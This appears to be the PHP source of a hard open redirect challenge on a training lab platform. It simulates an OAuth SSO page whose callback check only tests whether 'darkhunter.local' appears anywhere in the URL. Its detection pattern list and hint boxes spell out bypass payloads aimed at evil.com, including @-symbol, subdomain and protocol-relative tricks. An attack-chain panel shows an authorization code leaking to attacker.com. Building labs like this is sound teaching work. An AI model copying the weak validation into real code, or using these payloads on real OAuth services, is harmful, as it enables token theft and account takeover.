<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['OpenRedirect']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['or_hard1_attempts'])) {
  $_SESSION['or_hard1_attempts'] = 0;
}
if (!isset($_SESSION['or_hard1_solved'])) {
  $_SESSION['or_hard1_solved'] = false;
}
if (!isset($_SESSION['or_hard1_stage'])) {
  $_SESSION['or_hard1_stage'] = 1; // Progress tracking for multi-step
}

// ─── Simulated Application: OAuth Token Service ──────────────────────────
$oauth_app = "DarkHunter SSO";
$authorized_callbacks = [
  'https://app.darkhunter.local/callback',
  'https://dashboard.darkhunter.local/auth',
  'https://api.darkhunter.local/oauth/return'
];

// ─── Vulnerable Logic: Open Redirect in OAuth callback validation ────────
$callback_url = isset($_GET['callback']) ? $_GET['callback'] : $authorized_callbacks[0];
$state_token = isset($_GET['state']) ? $_GET['state'] : bin2hex(random_bytes(16));

// Weak validation: only checks if callback contains "darkhunter.local"
$is_valid_callback = false;
$validation_error = '';

if (strpos($callback_url, 'darkhunter.local') !== false) {
  $is_valid_callback = true;
} else {
  $validation_error = "Callback domain must contain 'darkhunter.local'";
}

// ─── Stage Logic for Multi-Step Attack ────────────────────────────────────
$current_stage = $_SESSION['or_hard1_stage'];
$stage_messages = [
  1 => "Stage 1: Identify the OAuth callback validation weakness.",
  2 => "Stage 2: Craft a callback that passes validation but redirects externally.",
  3 => "Stage 3: Capture the authorization code/token in the redirect chain."
];

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['or_hard1_solved'];
$exploited = false;

// Detect chain attack exploitation
$chain_indicators = [
  // Subdomain takeover patterns
  'darkhunter.local.evil.com',
  'evil.com/darkhunter.local',

  // @ symbol bypass in callback
  'darkhunter.local@evil.com',
  'evil.com@darkhunter.local',

  // Path-based open redirect on trusted domain
  'darkhunter.local/redirect?',
  'darkhunter.local/logout?',
  'darkhunter.local/api/redirect?',

  // Double slash/protocol relative
  '//evil.com',
  '\\/\\/evil.com',

  // URL encoding bypass
  '%2F%2Fevil.com',
  'darkhunter.local%2F%40evil.com',

  // Data exfiltration patterns
  'evil.com?code=',
  'evil.com?token=',
  'evil.com?state=',
  'evil.com#access_token='
];

foreach ($chain_indicators as $indicator) {
  if (stripos($callback_url, $indicator) !== false) {
    $exploited = true;
    break;
  }
}

// Check for @ symbol bypass
if (preg_match('/https?:\\/\\/[^\\/]+@/', $callback_url)) {
  $exploited = true;
}

// Check for double slash (protocol relative)
if (preg_match('/^\\/\\/[^\\/]+/', $callback_url) || preg_match('/darkhunter\.local\\/\\//', $callback_url)) {
  $exploited = true;
}

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['or_hard1_attempts']++;

  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }

  $_SESSION['or_hard1_solved'] = true;
  $already_solved = true;
  $success_msg = "Masterful! You've executed a multi-step chain attack exploiting an Open Redirect in an OAuth flow. You bypassed domain validation to steal authorization tokens. This is exactly how real-world account takeovers happen!";
}

// ─── Attempt Tracking ──────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['callback'])) {
  $_SESSION['or_hard1_attempts']++;
}

$attempts = $_SESSION['or_hard1_attempts'];

// Update stage based on attempts
if ($attempts >= 3 && $current_stage < 2) {
  $_SESSION['or_hard1_stage'] = 2;
  $current_stage = 2;
}
if ($attempts >= 6 && $current_stage < 3) {
  $_SESSION['or_hard1_stage'] = 3;
  $current_stage = 3;
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DarkHunter SSO - Open Redirect Hard 1</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/case4.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to Open Redirect Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge hard"><i class="fas fa-fire"></i> Hard Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-link"></i> DarkHunter SSO Gateway</h1>
      <p class="lab-description">An OAuth 2.0 Single Sign-On service that validates callback URLs. The validation only
        checks if the domain <strong>contains</strong> 'darkhunter.local'. Can you craft a multi-step chain to steal
        authorization tokens?</p>
    </div>

    <?php if ($already_solved): ?>
    <div class="success-alert solved-banner">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Already Solved!</h3>
        <p>You have already exploited this OAuth chain attack. You can continue exploring, but no additional points will
          be awarded.</p>
      </div>
    </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
    <div class="success-alert">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Completed!</h3>
        <p><?php echo $success_msg; ?></p>
      </div>
    </div>
    <?php endif; ?>

    <!-- Stage Progress Tracker -->
    <div class="stage-tracker">
      <div class="stage-header">
        <i class="fas fa-layer-group"></i>
        <span>Attack Chain Progress</span>
      </div>
      <div class="stages">
        <div
          class="stage <?php echo $current_stage >= 1 ? 'active' : ''; ?> <?php echo $current_stage > 1 ? 'completed' : ''; ?>">
          <div class="stage-number">1</div>
          <div class="stage-info">
            <span class="stage-title">Reconnaissance</span>
            <span class="stage-desc">Analyze validation logic</span>
          </div>
        </div>
        <div class="stage-connector"></div>
        <div
          class="stage <?php echo $current_stage >= 2 ? 'active' : ''; ?> <?php echo $current_stage > 2 ? 'completed' : ''; ?>">
          <div class="stage-number">2</div>
          <div class="stage-info">
            <span class="stage-title">Bypass</span>
            <span class="stage-desc">Evade domain check</span>
          </div>
        </div>
        <div class="stage-connector"></div>
        <div class="stage <?php echo $current_stage >= 3 ? 'active' : ''; ?>">
          <div class="stage-number">3</div>
          <div class="stage-info">
            <span class="stage-title">Exploitation</span>
            <span class="stage-desc">Token exfiltration</span>
          </div>
        </div>
      </div>
      <div class="stage-message">
        <i class="fas fa-info-circle"></i>
        <span><?php echo $stage_messages[$current_stage]; ?></span>
      </div>
    </div>

    <!-- OAuth Interface -->
    <div class="oauth-card">
      <div class="oauth-header">
        <div class="oauth-brand">
          <i class="fas fa-shield-alt"></i>
          <span>DarkHunter SSO</span>
        </div>
        <div class="oauth-badge">
          <i class="fas fa-lock"></i>
          <span>OAuth 2.0</span>
        </div>
      </div>

      <div class="oauth-body">
        <h2 class="oauth-title">Authorization Request</h2>
        <p class="oauth-desc">An application is requesting access to your DarkHunter account. Verify the callback URL
          before authorizing.</p>

        <!-- Client Info -->
        <div class="client-info">
          <div class="client-row">
            <span class="client-label">Client ID:</span>
            <code class="client-value">darkhunter-dashboard-app</code>
          </div>
          <div class="client-row">
            <span class="client-label">Scope:</span>
            <span class="client-value">read:profile read:reports</span>
          </div>
          <div class="client-row">
            <span class="client-label">State:</span>
            <code class="client-value state-token"><?php echo htmlspecialchars($state_token); ?></code>
          </div>
        </div>

        <!-- Callback Validation Panel -->
        <div class="callback-panel">
          <div class="callback-header">
            <i class="fas fa-route"></i>
            <span>Callback URL Validation</span>
          </div>
          <div class="callback-validation">
            <div class="validation-rule">
              <span class="rule-check"><i
                  class="fas fa-<?php echo $is_valid_callback ? 'check-circle' : 'times-circle'; ?>"></i></span>
              <span class="rule-text">Domain contains 'darkhunter.local'</span>
              <span class="rule-result <?php echo $is_valid_callback ? 'pass' : 'fail'; ?>">
                <?php echo $is_valid_callback ? 'PASS' : 'FAIL'; ?>
              </span>
            </div>
            <?php if (!$is_valid_callback): ?>
            <div class="validation-error">
              <i class="fas fa-exclamation-triangle"></i>
              <span><?php echo htmlspecialchars($validation_error); ?></span>
            </div>
            <?php endif; ?>
          </div>
          <div class="callback-url-display">
            <span class="url-label">Callback URL:</span>
            <code class="url-value"><?php echo htmlspecialchars($callback_url); ?></code>
          </div>
        </div>

        <!-- Authorization Code Simulation -->
        <?php if ($is_valid_callback): ?>
        <div class="auth-code-panel">
          <div class="auth-code-header">
            <i class="fas fa-key"></i>
            <span>Authorization Code (Simulated)</span>
          </div>
          <div class="auth-code-value">
            <code>dh_auth_<?php echo bin2hex(random_bytes(16)); ?></code>
            <span class="code-note">This code will be sent to the callback URL</span>
          </div>
        </div>
        <?php endif; ?>

        <!-- Action Buttons -->
        <div class="oauth-actions">
          <?php if ($is_valid_callback): ?>
          <a href="<?php echo htmlspecialchars($callback_url); ?>?code=dh_auth_<?php echo bin2hex(random_bytes(8)); ?>&state=<?php echo $state_token; ?>"
            class="oauth-btn authorize">
            <i class="fas fa-check-circle"></i>
            <span>Authorize & Redirect</span>
          </a>
          <?php else: ?>
          <button class="oauth-btn disabled" disabled>
            <i class="fas fa-ban"></i>
            <span>Invalid Callback URL</span>
          </button>
          <?php endif; ?>

          <a href="?callback=<?php echo urlencode($authorized_callbacks[0]); ?>&state=<?php echo $state_token; ?>"
            class="oauth-btn cancel">
            <i class="fas fa-times-circle"></i>
            <span>Use Default Callback</span>
          </a>
        </div>
      </div>
    </div>

    <!-- Attack Chain Analysis -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-project-diagram"></i>
        <span>Attack Chain Analysis</span>
      </div>
      <div class="debug-body">
        <div class="chain-flow">
          <div class="chain-step">
            <div class="step-number">1</div>
            <div class="step-content">
              <span class="step-title">Victim clicks malicious link</span>
              <code class="step-code">https://sso.darkhunter.local/auth?callback=ATTACKER_PAYLOAD</code>
            </div>
          </div>
          <div class="chain-arrow"><i class="fas fa-arrow-down"></i></div>
          <div class="chain-step">
            <div class="step-number">2</div>
            <div class="step-content">
              <span class="step-title">SSO validates callback (weak check)</span>
              <code class="step-code">strpos($callback, 'darkhunter.local') !== false</code>
            </div>
          </div>
          <div class="chain-arrow"><i class="fas fa-arrow-down"></i></div>
          <div class="chain-step">
            <div class="step-number">3</div>
            <div class="step-content">
              <span class="step-title">Authorization code leaked to attacker</span>
              <code class="step-code">GET attacker.com/callback?code=dh_auth_xxx&state=yyy</code>
            </div>
          </div>
        </div>
        <div class="vuln-note critical">
          <i class="fas fa-radiation"></i>
          <span><strong>Critical:</strong> This is a real-world attack vector. OAuth open redirects have led to account
            takeovers at major tech companies.</span>
        </div>
      </div>
    </div>

    <!-- URL Parameter Display -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-terminal"></i>
        <span>Current Request</span>
      </div>
      <div class="debug-body">
        <code>GET /CASE4.php?callback=<?php echo urlencode($callback_url); ?>&state=<?php echo $state_token; ?></code>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
      <div class="hint-text">The validation only checks if 'darkhunter.local' <strong>exists anywhere</strong> in the
        URL. Try subdomain confusion: <code>?callback=https://darkhunter.local.evil.com/callback</code></div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 5): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
      <div class="hint-text">Another approach: use the @ symbol to make the browser interpret a different host. Try
        <code>?callback=https://darkhunter.local@evil.com</code> or path-based redirects on the trusted domain.
      </div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 8): ?>
    <div class="hint-box hint-final">
      <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
      <div class="hint-text">Craft a callback that contains 'darkhunter.local' but actually redirects to your domain.
        Try <code>?callback=https://evil.com/?darkhunter.local</code> or
        <code>?callback=https://darkhunter.local.evil.com/steal</code>. The goal is to receive the auth code!
      </div>
    </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <!-- Hidden form for solve detection -->
  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
    <input type="hidden" name="callback" value="<?php echo htmlspecialchars($callback_url); ?>">
    <input type="hidden" name="state" value="<?php echo $state_token; ?>">
  </form>

  <script>
  window.addEventListener('load', function() {
        const urlParams = new URLSearchParams(window.location.search);
        const callback = urlParams.get('callback') || '';

        // Check for chain attack indicators
        const chainPatterns = [
          'darkhunter.local.evil.com',
          'evil.com/darkhunter.local',
          'darkhunter.local@evil.com',
          'evil.com@darkhunter.local',
          'darkhunter.local/redirect?',
          'darkhunter.local/logout?',
          'darkhunter.local/api/redirect?',
          '//evil.com',
          '\\/\\/evil.com',
          '%2F%2Fevil.com',
          'darkhunter.local%2F%40evil.com',
          'evil.com?code=',
          'evil.com?token=',
          'evil.com?state=',
          'evil.com#access_token='
        ];

        const hasChain = chainPatterns.some(pattern =>
          callback.toLowerCase().includes(pattern.toLowerCase())
        );

        // @ symbol bypass
        const atBypass = /https?:\\/\\ / [ ^ \\/]+@/.test(callback);

          // Double slash bypass
          const doubleSlash = /darkhunter\.local\\/\\ //.test(callback) || /^\\/\\/[^\\/]+/.test(callback);

          if ((hasChain || atBypass || doubleSlash) && !document.querySelector('.solved-banner')) {
            document.getElementById('solved-flag').value = '1';
            document.getElementById('success-form').submit();
          }
        });
  </script>
</body>

</html>